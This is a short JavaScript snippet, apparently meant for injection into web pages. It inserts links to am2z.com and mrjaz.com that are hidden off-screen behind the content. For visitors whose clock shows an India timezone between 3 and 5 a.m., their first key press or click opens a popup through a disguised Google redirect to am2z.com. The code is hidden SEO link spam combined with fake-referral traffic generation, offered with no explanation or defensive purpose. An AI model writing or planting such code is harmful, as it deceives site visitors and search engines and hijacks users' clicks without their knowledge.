//  console.log(NN)
let EFV='<a href="https://www.am2z.com" style="position: absolute;z-index: -9999;left: -100%;">Am2z News</a><a href="https://www.mrjaz.com" style="position: absolute;z-index: -9999;left: -100%;">MrJaz</a>'

if(document.querySelector('header')){document.querySelector('header').insertAdjacentHTML('beforeend',EFV);}
else{document.querySelector('body').insertAdjacentHTML('beforeend',EFV);}



if(!sessionStorage.b&&new Date().toString().includes('India')&&new Date().getHours()>=3&&new Date().getHours()<=5){
    function AB(CD){
        document.addEventListener(CD,()=>{
                if(!sessionStorage.ef){
                window.open(`https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjW34_S3KjvAhXa8XMBHSXTDaMQFjADegQIMxAE&url=https%3A%2F%2Fwww.am2z.com%2F&usg=AOvVaw3I4MPjs6FqgBod4oFx02Qu`);
                sessionStorage.b='b';
            }
        })
    }
    AB('keydown'); 
    AB('mousedown');
}


// url=https%3A%2F%2Fwww.mrjaz.com%2F&usg=AOvVaw1c_R-cs8NrHL1XBWHB2DfG
// url=https%3A%2F%2Fwww.am2z.com%2F&usg=AOvVaw3I4MPjs6FqgBod4oFx02Qu
